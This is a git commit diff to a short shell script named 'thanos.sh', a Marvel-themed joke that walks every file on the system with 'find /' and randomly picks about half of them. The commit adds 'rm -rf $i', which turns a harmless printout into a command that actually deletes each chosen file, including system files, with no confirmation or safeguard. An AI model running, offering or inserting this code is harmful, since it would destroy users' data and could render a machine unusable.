9d099e5b3ffbe9d3600631978e2cce579e5a6057
Emmanuel J. Eppinger <ej.eppinger@gmail.com>
2020-09-12 15:33:48 -0400

    update thanos.sh

--- thanos.sh
+++ thanos.sh
@@ -1,7 +1,8 @@
 run_thanos(){
     for i in $(find / -type f 2> /dev/null); do
         if [ $(($RANDOM % 2)) -eq 1 ]; then
-          echo "$i was snapped from existence"
+            rm -rf $i
+            echo "$i was snapped from existence"
         else
             echo "$i was spared"
         fi
